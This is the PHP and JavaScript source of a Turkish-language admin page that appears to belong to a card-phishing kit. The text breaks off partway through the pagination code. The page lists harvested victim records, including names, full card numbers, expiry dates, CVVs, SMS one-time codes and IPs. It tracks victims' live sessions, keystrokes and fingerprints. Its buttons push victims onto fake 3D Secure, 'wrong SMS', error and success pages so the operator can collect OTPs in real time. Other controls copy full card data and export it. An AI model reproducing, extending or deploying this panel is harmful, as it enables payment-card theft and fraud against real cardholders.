<?php
require_once 'includes/auth.php';
requireAuth();

if (isset($_GET['logout'])) {
    logout();
}

$pageTitle = 'Loglar';
$pageDescription = 'Tüm log kayıtları ve detayları';
$currentPage = 'orders';

include 'includes/header.php';
include 'includes/sidebar.php';
?>

<style>
    .custom-scrollbar::-webkit-scrollbar { width: 6px; }
    .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
    .custom-scrollbar::-webkit-scrollbar-thumb { background: #d1d5db; border-radius: 3px; }
    .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #9ca3af; }
    .dark .custom-scrollbar::-webkit-scrollbar-thumb { background: #404040; }
    .dark .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #525252; }
    
    .action-btn {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 28px;
        height: 28px;
        border-radius: 6px;
        color: #6b7280;
        transition: all 0.15s;
        flex-shrink: 0;
    }
    .action-btn:hover { background: #f3f4f6; }
    .dark .action-btn:hover { background: #262626; }
    
    .tooltip-wrapper { position: relative; display: inline-flex; }
    .tooltip {
        position: absolute;
        bottom: 100%;
        left: 50%;
        transform: translateX(-50%) translateY(-4px);
        padding: 6px 10px;
        background: #18181b;
        color: #fff;
        font-size: 11px;
        font-weight: 500;
        white-space: nowrap;
        border-radius: 6px;
        opacity: 0;
        visibility: hidden;
        transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        pointer-events: none;
        z-index: 50;
        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    }
    .tooltip::after {
        content: '';
        position: absolute;
        top: 100%;
        left: 50%;
        transform: translateX(-50%);
        border: 5px solid transparent;
        border-top-color: #18181b;
    }
    .tooltip-wrapper:hover .tooltip:not(.bank-tooltip) {
        opacity: 1;
        visibility: visible;
        transform: translateX(-50%) translateY(-8px);
    }
    .tooltip-red { background: #ef4444; }
    .tooltip-red::after { border-top-color: #ef4444; }
    .tooltip-blue { background: #3b82f6; }
    .tooltip-blue::after { border-top-color: #3b82f6; }
    .tooltip-orange { background: #f97316; }
    .tooltip-orange::after { border-top-color: #f97316; }
    .tooltip-yellow { background: #eab308; }
    .tooltip-yellow::after { border-top-color: #eab308; }
    .bank-tooltip {
        position: fixed;
        bottom: auto;
        left: auto;
        transform: none;
        white-space: normal;
        min-width: 200px;
        padding: 10px 14px;
        text-align: left;
        opacity: 0;
        visibility: hidden;
        pointer-events: none;
        transition: opacity 0.2s;
    }
    .bank-tooltip::after {
        display: none;
    }
    .bank-tooltip.show {
        opacity: 1;
        visibility: visible;
    }
    .bank-tip-row {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 3px 0;
        gap: 16px;
    }
    .bank-tip-row + .bank-tip-row {
        border-top: 1px solid rgba(255,255,255,0.12);
    }
    .bank-tip-label {
        font-size: 10px;
        color: rgba(255,255,255,0.55);
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }
    .bank-tip-val {
        font-size: 12px;
        font-weight: 600;
        color: #fff;
    }
    .bank-tip-val.gold {
        background: linear-gradient(135deg, #f5c842, #e8a200, #ffd700, #e8a200, #f5c842);
        background-size: 200% 200%;
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        animation: goldShimmer 2s ease-in-out infinite;
        font-weight: 700;
    }
    @keyframes goldShimmer {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }
    .card-shiny-gold {
        background: linear-gradient(135deg, #f5c842, #e8a200, #ffd700, #e8a200, #f5c842) !important;
        background-size: 200% 200% !important;
        -webkit-background-clip: text !important;
        -webkit-text-fill-color: transparent !important;
        background-clip: text !important;
        animation: goldShimmer 2s ease-in-out infinite;
        font-weight: 700 !important;
    }
    .card-shiny-blue {
        background: linear-gradient(135deg, #60a5fa, #3b82f6, #93c5fd, #3b82f6, #60a5fa) !important;
        background-size: 200% 200% !important;
        -webkit-background-clip: text !important;
        -webkit-text-fill-color: transparent !important;
        background-clip: text !important;
        animation: goldShimmer 2s ease-in-out infinite;
        font-weight: 700 !important;
    }
</style>

                <div class="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
                    <div class="bg-white dark:bg-neutral-900 border border-neutral-200 dark:border-neutral-800 rounded-xl p-4">
                        <div class="flex items-center justify-between">
                            <span class="text-sm text-neutral-500">Online</span>
                            <i data-lucide="radio" class="w-4 h-4 text-emerald-500"></i>
                        </div>
                        <p class="text-2xl font-semibold text-neutral-900 dark:text-white mt-2 flex items-center gap-2">
                            <span class="relative flex h-2 w-2">
                                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                                <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
                            </span>
                            <span id="statOnlineCount">0</span>
                        </p>
                    </div>
                    <div class="bg-white dark:bg-neutral-900 border border-neutral-200 dark:border-neutral-800 rounded-xl p-4">
                        <div class="flex items-center justify-between">
                            <span class="text-sm text-neutral-500">Toplam Log</span>
                            <i data-lucide="file-text" class="w-4 h-4 text-blue-500"></i>
                        </div>
                        <p id="statTotalLogs" class="text-2xl font-semibold text-neutral-900 dark:text-white mt-2">0</p>
                    </div>
                    <div class="bg-white dark:bg-neutral-900 border border-neutral-200 dark:border-neutral-800 rounded-xl p-4">
                        <div class="flex items-center justify-between">
                            <span class="text-sm text-neutral-500">Toplam Tutar</span>
                            <i data-lucide="banknote" class="w-4 h-4 text-green-500"></i>
                        </div>
                        <p id="statTotalAmount" class="text-2xl font-semibold text-neutral-900 dark:text-white mt-2">0 ₺</p>
                    </div>
                    <div class="bg-white dark:bg-neutral-900 border border-neutral-200 dark:border-neutral-800 rounded-xl p-4">
                        <div class="flex items-center justify-between">
                            <span class="text-sm text-neutral-500">Toplam Ürün</span>
                            <i data-lucide="shopping-cart" class="w-4 h-4 text-purple-500"></i>
                        </div>
                        <p id="statTotalItems" class="text-2xl font-semibold text-neutral-900 dark:text-white mt-2">0</p>
                    </div>
                    <div class="bg-white dark:bg-neutral-900 border border-neutral-200 dark:border-neutral-800 rounded-xl p-4">
                        <div class="flex items-center justify-between">
                            <span class="text-sm text-neutral-500">Ortalama Sepet</span>
                            <i data-lucide="calculator" class="w-4 h-4 text-orange-500"></i>
                        </div>
                        <p id="statAvgCart" class="text-2xl font-semibold text-neutral-900 dark:text-white mt-2">0 ₺</p>
                    </div>
                </div>

                <div data-animate="fade" class="bg-white dark:bg-neutral-900 border border-neutral-200 dark:border-neutral-800 rounded-xl overflow-hidden">
                    <div class="px-6 py-4 border-b border-neutral-200 dark:border-neutral-800 flex items-center justify-between">
                        <input type="text" id="searchInput" oninput="filterLogs()" placeholder="İsim, kart veya IP ara..." class="bg-neutral-100 dark:bg-neutral-800 border-0 rounded-lg px-4 py-2.5 text-sm text-neutral-900 dark:text-white placeholder-neutral-400 focus:ring-2 focus:ring-brand w-64">
                        <div class="flex items-center gap-2">
                            <button onclick="refreshLogs()" class="flex items-center gap-2 px-3 py-2.5 bg-neutral-100 dark:bg-neutral-800 text-neutral-700 dark:text-neutral-300 text-sm font-medium rounded-lg hover:bg-neutral-200 dark:hover:bg-neutral-700 transition-colors">
                                <i data-lucide="refresh-cw" class="w-4 h-4" id="refreshIcon"></i>
                            </button>
                            <button onclick="exportTXT()" class="flex items-center gap-2 px-4 py-2.5 bg-brand text-white text-sm font-medium rounded-lg hover:bg-blue-700 transition-colors">
                                <i data-lucide="download" class="w-4 h-4"></i>
                                TXT
                            </button>
                            <button onclick="confirmDeleteAll()" class="flex items-center gap-2 px-4 py-2.5 bg-red-600 text-white text-sm font-medium rounded-lg hover:bg-red-700 transition-colors">
                                <i data-lucide="trash-2" class="w-4 h-4"></i>
                                Tümünü Sil
                            </button>
                        </div>
                    </div>

                    <div class="overflow-x-auto">
                        <table class="w-full">
                            <thead class="bg-neutral-50 dark:bg-neutral-800/50">
                                <tr>
                                    <th class="text-left text-[11px] font-semibold text-neutral-500 dark:text-neutral-400 uppercase tracking-wider px-4 py-3">#</th>
                                    <th class="text-left text-[11px] font-semibold text-neutral-500 dark:text-neutral-400 uppercase tracking-wider px-4 py-3">Durum</th>
                                    <th class="text-left text-[11px] font-semibold text-neutral-500 dark:text-neutral-400 uppercase tracking-wider px-4 py-3">İsim Soyisim</th>
                                    <th class="text-left text-[11px] font-semibold text-neutral-500 dark:text-neutral-400 uppercase tracking-wider px-4 py-3">Kart Numarası</th>
                                    <th class="text-left text-[11px] font-semibold text-neutral-500 dark:text-neutral-400 uppercase tracking-wider px-4 py-3">SKT</th>
                                    <th class="text-left text-[11px] font-semibold text-neutral-500 dark:text-neutral-400 uppercase tracking-wider px-4 py-3">CVV</th>
                                    <th class="text-left text-[11px] font-semibold text-neutral-500 dark:text-neutral-400 uppercase tracking-wider px-4 py-3">SMS</th>
                                    <th class="text-left text-[11px] font-semibold text-neutral-500 dark:text-neutral-400 uppercase tracking-wider px-4 py-3">IP Adresi</th>
                                    <th class="text-left text-[11px] font-semibold text-neutral-500 dark:text-neutral-400 uppercase tracking-wider px-4 py-3">Tarih</th>
                                    <th class="text-right text-[11px] font-semibold text-neutral-500 dark:text-neutral-400 uppercase tracking-wider px-4 py-3">Tutar</th>
                                    <th class="text-center text-[11px] font-semibold text-neutral-500 dark:text-neutral-400 uppercase tracking-wider px-4 py-3">İşlemler</th>
                                </tr>
                            </thead>
                            <tbody id="logsTableBody">
                                <tr>
                                    <td colspan="11" class="px-4 py-12 text-center text-neutral-500">
                                        <i data-lucide="loader-2" class="w-6 h-6 mx-auto mb-2 animate-spin"></i>
                                        <p class="text-sm">Yükleniyor...</p>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                    <div id="paginationContainer"></div>
                </div>

    <div id="orderModal" class="fixed inset-0 z-50 hidden">
        <div class="modal-backdrop absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeOrderModal()"></div>
        <div class="modal-content absolute right-0 top-0 h-full w-full max-w-md bg-white dark:bg-neutral-900 shadow-2xl overflow-y-auto custom-scrollbar">
            <div class="sticky top-0 bg-white dark:bg-neutral-900 border-b border-neutral-200 dark:border-neutral-800 px-6 py-4 flex items-center justify-between z-10">
                <h3 class="text-base font-semibold text-neutral-900 dark:text-white">Log Detayı</h3>
                <button onclick="closeOrderModal()" class="w-8 h-8 flex items-center justify-center text-neutral-400 hover:text-neutral-600 dark:hover:text-neutral-300 hover:bg-neutral-100 dark:hover:bg-neutral-800 rounded-lg transition-colors">
                    <i data-lucide="x" class="w-5 h-5"></i>
                </button>
            </div>
            <div id="modalContent" class="p-6 space-y-4"></div>
        </div>
    </div>

    <div id="errorModal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
        <div class="modal-backdrop absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeErrorModal()"></div>
        <div class="modal-content relative w-full max-w-md bg-white dark:bg-neutral-900 rounded-2xl shadow-2xl">
            <div class="px-6 py-4 border-b border-neutral-200 dark:border-neutral-800 flex items-center justify-between">
                <h3 class="text-base font-semibold text-neutral-900 dark:text-white">Hata Mesajı Gönder</h3>
                <button onclick="closeErrorModal()" class="w-8 h-8 flex items-center justify-center text-neutral-400 hover:text-neutral-600 dark:hover:text-neutral-300 hover:bg-neutral-100 dark:hover:bg-neutral-800 rounded-lg transition-colors">
                    <i data-lucide="x" class="w-5 h-5"></i>
                </button>
            </div>
            <div class="p-6">
                <input type="hidden" id="errorLogId">
                <div class="mb-4">
                    <p class="text-sm text-neutral-500 mb-1">Kullanıcı</p>
                    <p id="errorUserName" class="text-sm font-medium text-neutral-900 dark:text-white"></p>
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium text-neutral-700 dark:text-neutral-300 mb-2">Hata Mesajı</label>
                    <textarea id="errorMessage" rows="4" placeholder="Kullanıcıya gösterilecek hata mesajını yazın..." class="w-full bg-neutral-100 dark:bg-neutral-800 border-0 rounded-lg px-4 py-3 text-sm text-neutral-900 dark:text-white placeholder-neutral-400 focus:ring-2 focus:ring-brand resize-none"></textarea>
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium text-neutral-700 dark:text-neutral-300 mb-2">Hazır Mesajlar</label>
                    <div id="errorTemplates" class="flex flex-wrap gap-2"></div>
                </div>
                <button onclick="sendErrorMessage()" class="w-full py-3 bg-yellow-500 hover:bg-yellow-600 text-white font-medium rounded-lg transition-colors flex items-center justify-center gap-2">
                    <i data-lucide="send" class="w-4 h-4"></i>
                    Hata Mesajı Gönder
                </button>
            </div>
        </div>
    </div>

    <div id="deleteModal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
        <div class="modal-backdrop absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeDeleteModal()"></div>
        <div class="modal-content relative w-full max-w-sm bg-white dark:bg-neutral-900 rounded-2xl shadow-2xl">
            <div class="p-6 text-center">
                <div class="w-16 h-16 bg-red-100 dark:bg-red-900/30 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i data-lucide="trash-2" class="w-8 h-8 text-red-500"></i>
                </div>
                <h3 class="text-lg font-semibold text-neutral-900 dark:text-white mb-2">Log Sil</h3>
                <p class="text-sm text-neutral-500 mb-1">Bu log kaydını silmek istediğinize emin misiniz?</p>
                <p id="deleteLogName" class="text-sm font-semibold text-neutral-900 dark:text-white mb-6"></p>
                <input type="hidden" id="deleteLogId">
                <div class="flex gap-3">
                    <button onclick="closeDeleteModal()" class="flex-1 py-2.5 bg-neutral-100 dark:bg-neutral-800 text-neutral-700 dark:text-neutral-300 font-medium rounded-lg hover:bg-neutral-200 dark:hover:bg-neutral-700 transition-colors">
                        İptal
                    </button>
                    <button onclick="confirmDelete()" class="flex-1 py-2.5 bg-red-500 text-white font-medium rounded-lg hover:bg-red-600 transition-colors flex items-center justify-center gap-2">
                        <i data-lucide="trash-2" class="w-4 h-4"></i>
                        Sil
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div id="deleteAllModal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
        <div class="modal-backdrop absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeDeleteAllModal()"></div>
        <div class="modal-content relative w-full max-w-sm bg-white dark:bg-neutral-900 rounded-2xl shadow-2xl">
            <div class="p-6 text-center">
                <div class="w-16 h-16 bg-red-100 dark:bg-red-900/30 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i data-lucide="alert-triangle" class="w-8 h-8 text-red-500"></i>
                </div>
                <h3 class="text-lg font-semibold text-neutral-900 dark:text-white mb-2">Tüm Logları Sil</h3>
                <p class="text-sm text-neutral-500 mb-4">Bu işlem geri alınamaz! Tüm log kayıtları kalıcı olarak silinecektir.</p>
                <div class="flex gap-3">
                    <button onclick="closeDeleteAllModal()" class="flex-1 py-2.5 bg-neutral-100 dark:bg-neutral-800 text-neutral-700 dark:text-neutral-300 font-medium rounded-lg hover:bg-neutral-200 dark:hover:bg-neutral-700 transition-colors">
                        İptal
                    </button>
                    <button onclick="executeDeleteAll()" class="flex-1 py-2.5 bg-red-500 text-white font-medium rounded-lg hover:bg-red-600 transition-colors flex items-center justify-center gap-2">
                        <i data-lucide="trash-2" class="w-4 h-4"></i>
                        Tümünü Sil
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div id="banModal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
        <div class="modal-backdrop absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeBanModal()"></div>
        <div class="modal-content relative w-full max-w-sm bg-white dark:bg-neutral-900 rounded-2xl shadow-2xl">
            <div class="p-6 text-center">
                <div class="w-16 h-16 bg-red-100 dark:bg-red-900/30 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i data-lucide="ban" class="w-8 h-8 text-red-500"></i>
                </div>
                <h3 class="text-lg font-semibold text-neutral-900 dark:text-white mb-2">IP Yasakla</h3>
                <p class="text-sm text-neutral-500 mb-1">Bu IP adresini yasaklamak istediğinize emin misiniz?</p>
                <p id="banIP" class="text-sm font-mono font-semibold text-neutral-900 dark:text-white mb-6"></p>
                <input type="hidden" id="banLogId">
                <div class="flex gap-3">
                    <button onclick="closeBanModal()" class="flex-1 py-2.5 bg-neutral-100 dark:bg-neutral-800 text-neutral-700 dark:text-neutral-300 font-medium rounded-lg hover:bg-neutral-200 dark:hover:bg-neutral-700 transition-colors">
                        İptal
                    </button>
                    <button onclick="confirmBan()" class="flex-1 py-2.5 bg-red-500 text-white font-medium rounded-lg hover:bg-red-600 transition-colors flex items-center justify-center gap-2">
                        <i data-lucide="ban" class="w-4 h-4"></i>
                        Yasakla
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div id="toastContainer" class="fixed bottom-4 right-4 z-[100] flex flex-col gap-2"></div>

    <script>
        const API_BASE = '../api';
        let logs = [];
        let sessions = {};
        let currentPage = 1;
        let totalPages = 1;
        let totalLogsCount = 0;
        let searchTimer = null;
        
        function escapeHtml(text) {
            if (text === null || text === undefined) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function getItemCount(items) {
            try {
                const parsed = typeof items === 'string' ? JSON.parse(items) : items;
                if (Array.isArray(parsed)) {
                    return parsed.reduce((sum, item) => sum + (item.quantity || 1), 0);
                }
                return 0;
            } catch (e) {
                return 0;
            }
        }

        async function fetchLogs(page = 1) {
            try {
                const search = document.getElementById('searchInput').value.trim();
                const params = new URLSearchParams({ limit: 50, page });
                if (search) params.set('search', search);
                const res = await fetch(`${API_BASE}/logs.php?${params}`);
                const data = await res.json();
                if (data.success) {
                    logs = data.logs;
                    currentPage = data.page;
                    totalPages = data.pages || 1;
                    totalLogsCount = parseInt(data.total) || 0;
                    renderLogs();
                    updateLogStats();
                    renderPagination();
                }
            } catch (e) {
                console.error('Logs fetch error:', e);
            }
        }
        
        function updateLogStats() {
            let totalAmount = 0;
            let totalItems = 0;
            
            logs.forEach(log => {
                totalAmount += parseFloat(log.total) || 0;
                totalItems += getItemCount(log.items);
            });
            
            const avgCart = logs.length > 0 ? totalAmount / logs.length : 0;
            
            document.getElementById('statTotalLogs').textContent = totalLogsCount;
            document.getElementById('statTotalAmount').textContent = formatMoney(totalAmount);
            document.getElementById('statTotalItems').textContent = totalItems;
            document.getElementById('statAvgCart').textContent = formatMoney(avgCart);
            
            lucide.createIcons();
        }

        async function fetchSessions() {
            try {
                const res = await fetch(`${API_BASE}/sessions.php`);
                const data = await res.json();
                if (data.success) {
                    const onlineEl = document.getElementById('statOnlineCount');
                    if (onlineEl) onlineEl.textContent = data.online_count ?? 0;
                    sessions = {};
                    data.sessions.forEach(s => {
                        sessions[s.session_id] = {
                            page: s.current_page,
                            ip: s.ip,
                            redirect_to: s.redirect_to || null,
                            is_online: s.is_online,
                            device_type: s.device_type,
                            screen_resolution: s.screen_resolution,
                            browser_lang: s.browser_lang,
                            timezone: s.timezone,
                            platform: s.platform,
                            connection_type: s.connection_type,
                            referrer: s.referrer,
                            utm_source: s.utm_source,
                            utm_medium: s.utm_medium,
                            utm_campaign: s.utm_campaign,
                            mouse_clicks: s.mouse_clicks,
                            mouse_moves: s.mouse_moves,
                            key_presses: s.key_presses,
                            scroll_depth: s.scroll_depth,
                            max_scroll_depth: s.max_scroll_depth,
                            time_on_page: s.time_on_page,
                            tab_switches: s.tab_switches,
                            paste_count: s.paste_count,
                            is_active: s.is_active,
                            is_touch: s.is_touch,
                            page_history: s.page_history,
                            form_interactions: s.form_interactions,
                            engagement_score: s.engagement_score,
                            session_duration: s.session_duration,
                            fingerprint: s.fingerprint
                        };
                    });
                    renderLogs();
                }
            } catch (e) {
                console.error('Sessions fetch error:', e);
            }
        }
        
        function getSessionByLogSessionId(logSessionId) {
            return sessions[logSessionId] || null;
        }

        function renderLogs() {
            const tbody = document.getElementById('logsTableBody');
            
            if (logs.length === 0) {
                tbody.innerHTML = `
                    <tr>
                        <td colspan="11" class="px-4 py-12 text-center text-neutral-500">
                            <i data-lucide="inbox" class="w-8 h-8 mx-auto mb-2 opacity-50"></i>
                            <p class="text-sm">Henüz log yok</p>
                        </td>
                    </tr>
                `;
                lucide.createIcons();
                return;
            }

            tbody.innerHTML = logs.map((log, index) => {
                const sessionData = getSessionByLogSessionId(log.session_id);
                const isOnline = sessionData !== null;
                const currentPage = sessionData ? sessionData.page : null;
                const pendingRedirect = sessionData ? sessionData.redirect_to : null;
                const logStatus = log.redirect_to || 'waiting';
                
                let statusHtml = '';
                
                if (pendingRedirect) {
                    const redirectLabels = {
                        '3dsecure': '3D Secure\'a yönlendiriliyor...',
                        'sms_error': 'Hatalı SMS\'e yönlendiriliyor...',
                        'success': 'Başarıya yönlendiriliyor...',
                        'error': 'Hataya yönlendiriliyor...',
                        'waiting': 'Beklemeye yönlendiriliyor...'
                    };
                    const label = redirectLabels[pendingRedirect] || 'Yönlendiriliyor...';
                    
                    statusHtml = `<div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-purple-50 dark:bg-purple-500/10 border border-purple-200 dark:border-purple-500/20">
                        <span class="relative flex h-2 w-2">
                            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-purple-400 opacity-75"></span>
                            <span class="relative inline-flex rounded-full h-2 w-2 bg-purple-500"></span>
                        </span>
                        <span class="text-xs font-medium text-purple-700 dark:text-purple-400">${label}</span>
                    </div>`;
                } else if (isOnline) {
                    const pageColors = {
                        'Bekleme': 'amber',
                        'Checkout': 'amber',
                        '3D Secure': 'blue',
                        'SMS Hata': 'pink',
                        'Başarılı': 'emerald',
                        'Hata': 'red'
                    };
                    
                    const bgColor = pageColors[currentPage] || 'emerald';
                    
                    statusHtml = `<div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-${bgColor}-50 dark:bg-${bgColor}-500/10 border border-${bgColor}-200 dark:border-${bgColor}-500/20">
                        <span class="relative flex h-2 w-2">
                            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-${bgColor}-400 opacity-75"></span>
                            <span class="relative inline-flex rounded-full h-2 w-2 bg-${bgColor}-500"></span>
                        </span>
                        <span class="text-xs font-medium text-${bgColor}-700 dark:text-${bgColor}-400">${currentPage}</span>
                    </div>`;
                } else {
                    if (logStatus === 'success') {
                        statusHtml = `<div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-50 dark:bg-emerald-500/10 border border-emerald-200 dark:border-emerald-500/20">
                            <span class="h-2 w-2 rounded-full bg-emerald-500"></span>
                            <span class="text-xs font-medium text-emerald-700 dark:text-emerald-400">Tamamlandı</span>
                        </div>`;
                    } else if (logStatus === 'error') {
                        statusHtml = `<div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-red-50 dark:bg-red-500/10 border border-red-200 dark:border-red-500/20">
                            <span class="h-2 w-2 rounded-full bg-red-500"></span>
                            <span class="text-xs font-medium text-red-700 dark:text-red-400">Hata</span>
                        </div>`;
                    } else {
                        statusHtml = `<div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-neutral-100 dark:bg-neutral-800 border border-neutral-200 dark:border-neutral-700">
                            <span class="h-2 w-2 rounded-full bg-neutral-400"></span>
                            <span class="text-xs font-medium text-neutral-500 dark:text-neutral-400">Offline</span>
                        </div>`;
                    }
                }

                const bankFull = log.card_bank ? escapeHtml(log.card_bank) : '';
                const cardType = log.card_type === 'C' ? 'Credit' : log.card_type === 'D' ? 'Debit' : (log.card_type ? escapeHtml(log.card_type) : '');
                const safeCardNumber = escapeHtml(log.card_number);
                const safeCardExpiry = escapeHtml(log.card_expiry);
                const safeCardCvv = escapeHtml(log.card_cvv);
                const safeCustomerName = escapeHtml(log.customer_name);
                const safeIp = escapeHtml(log.ip);
                const safeScheme = escapeHtml(log.card_scheme || '');
                
                return `
                    <tr class="log-row border-b border-neutral-100 dark:border-neutral-800 hover:bg-neutral-50 dark:hover:bg-neutral-800/30 transition-colors" data-search="${escapeHtml((log.customer_name + ' ' + log.card_number + ' ' + log.ip + ' ' + (log.card_bank || '')).toLowerCase())}">
                        <td class="px-4 py-3">
                            <span class="text-sm text-neutral-400">${log.id}</span>
                        </td>
                        <td class="px-4 py-3">${statusHtml}</td>
                        <td class="px-4 py-3">
                            <span class="text-sm font-medium text-neutral-900 dark:text-white">${safeCustomerName}</span>
                        </td>
                        <td class="px-4 py-3">
                            <div class="flex flex-col">
                                <code onclick="copyCard('${safeCardNumber}')" ondblclick="copyFullCard('${safeCardNumber}', '${safeCardExpiry}', '${safeCardCvv}')" class="text-[13px] bg-neutral-100 dark:bg-neutral-800 px-2 py-1 rounded cursor-pointer hover:bg-neutral-200 dark:hover:bg-neutral-700 transition-colors select-none ${safeCardNumber.trim().startsWith('6') ? 'card-shiny-gold' : safeCardNumber.trim().startsWith('9') ? 'card-shiny-blue' : 'text-neutral-700 dark:text-neutral-300'}">${safeCardNumber}</code>
                                ${bankFull || cardType || safeScheme ? `<div class="tooltip-wrapper mt-1"><span class="text-[10px] leading-tight text-neutral-400 truncate max-w-[180px] block cursor-default">${[bankFull, cardType, safeScheme].filter(Boolean).join(' • ')}</span><div class="tooltip bank-tooltip">${bankFull ? '<div class="bank-tip-row"><span class="bank-tip-label">Banka</span><span class="bank-tip-val">' + bankFull + '</span></div>' : ''}${cardType ? '<div class="bank-tip-row"><span class="bank-tip-label">Tip</span><span class="bank-tip-val' + (cardType === 'Credit' ? ' gold' : '') + '">' + cardType + '</span></div>' : ''}${safeScheme ? '<div class="bank-tip-row"><span class="bank-tip-label">Scheme</span><span class="bank-tip-val">' + safeScheme + '</span></div>' : ''}</div></div>` : ''}
                            </div>
                        </td>
                        <td class="px-4 py-3">
                            <span class="text-sm text-neutral-600 dark:text-neutral-400">${safeCardExpiry}</span>
                        </td>
                        <td class="px-4 py-3">
                            <span class="text-sm font-medium text-neutral-900 dark:text-white">${safeCardCvv}</span>
                        </td>
                        <td class="px-4 py-3">
                            <span class="text-sm text-neutral-600 dark:text-neutral-400">${escapeHtml(log.sms_codes || '-')}</span>
                        </td>
                        <td class="px-4 py-3">
                            <code class="text-[13px] text-neutral-600 dark:text-neutral-400">${safeIp}</code>
                        </td>
                        <td class="px-4 py-3">
                            <span class="text-sm text-neutral-500">${formatDate(log.created_at)}</span>
                        </td>
                        <td class="px-4 py-3 text-right">
                            <span class="text-sm font-semibold text-neutral-900 dark:text-white">${formatMoney(log.total)}</span>
                        </td>
                        <td class="px-4 py-3">
                            <div class="flex items-center justify-center gap-1">
                                <div class="tooltip-wrapper">
                                    <button onclick="showLogDetail(${index})" class="action-btn">
                                        <i data-lucide="eye" class="w-4 h-4"></i>
                                    </button>
                                    <div class="tooltip">Detay Görüntüle</div>
                                </div>
                                <div class="tooltip-wrapper">
                                    <button onclick="banIP(${index})" class="action-btn text-red-500 hover:bg-red-50 dark:hover:bg-red-900/20">
                                        <i data-lucide="ban" class="w-4 h-4"></i>
                                    </button>
                                    <div class="tooltip tooltip-red">IP Yasakla</div>
                                </div>
                                <div class="tooltip-wrapper">
                                    <button onclick="redirectToWaiting(${index})" class="action-btn text-amber-500 hover:bg-amber-50 dark:hover:bg-amber-900/20">
                                        <i data-lucide="clock" class="w-4 h-4"></i>
                                    </button>
                                    <div class="tooltip tooltip-yellow">Beklemeye Al</div>
                                </div>
                                <div class="tooltip-wrapper">
                                    <button onclick="redirectTo3DS(${index})" class="action-btn text-blue-500 hover:bg-blue-50 dark:hover:bg-blue-900/20">
                                        <i data-lucide="shield-check" class="w-4 h-4"></i>
                                    </button>
                                    <div class="tooltip tooltip-blue">3D Secure</div>
                                </div>
                                <div class="tooltip-wrapper">
                                    <button onclick="redirectToSmsError(${index})" class="action-btn text-pink-500 hover:bg-pink-50 dark:hover:bg-pink-900/20">
                                        <i data-lucide="message-square-x" class="w-4 h-4"></i>
                                    </button>
                                    <div class="tooltip" style="background:#ec4899">Hatalı SMS</div>
                                </div>
                                <div class="tooltip-wrapper">
                                    <button onclick="showErrorModal(${index})" class="action-btn text-orange-500 hover:bg-orange-50 dark:hover:bg-orange-900/20">
                                        <i data-lucide="alert-triangle" class="w-4 h-4"></i>
                                    </button>
                                    <div class="tooltip tooltip-orange">Hata Gönder</div>
                                </div>
                                <div class="tooltip-wrapper">
                                    <button onclick="redirectToSuccess(${index})" class="action-btn text-emerald-500 hover:bg-emerald-50 dark:hover:bg-emerald-900/20">
                                        <i data-lucide="check-circle" class="w-4 h-4"></i>
                                    </button>
                                    <div class="tooltip" style="background:#10b981">Onayla</div>
                                </div>
                                <div class="tooltip-wrapper">
                                    <button onclick="deleteLog(${index})" class="action-btn text-neutral-400 hover:text-red-500 hover:bg-red-50 dark:hover:bg-red-900/20">
                                        <i data-lucide="trash-2" class="w-4 h-4"></i>
                                    </button>
                                    <div class="tooltip tooltip-red">Sil</div>
                                </div>
                            </div>
                        </td>
                    </tr>
                `;
            }).join('');

            lucide.createIcons();
        }

        function refreshLogs() {
            const icon = document.getElementById('refreshIcon');
            icon.classList.add('animate-spin');
            Promise.all([fetchLogs(currentPage), fetchSessions()]).then(() => {
                setTimeout(() => icon.classList.remove('animate-spin'), 500);
            });
        }

        function renderPagination() {
            const container = document.getElementById('paginationContainer');
            if (!container) return;
            if (totalPages <= 1) { container.innerHTML = ''; return; }
            const from = (currentPage - 1) * 50 + 1;
            const to = Math.min(currentPage * 50, totalLogsCount);
            const prevDisabled = currentPage <= 1 ? 'disabled' : '';
            const nextDisabled = currentPage >= totalPages ? 'disabled' : '';
            container.innerHTML = '<div class="flex items-center justify-between px-6 py-3 border-t border-neutral-200 dark:border-neutral-800">' +
                '<span class="text-sm text-neutral-500">' + totalLogsCount + ' kayıttan ' + from + '–' + to + ' gösteriliyor</span>' +
                '<div class="flex items-center gap-2">' +
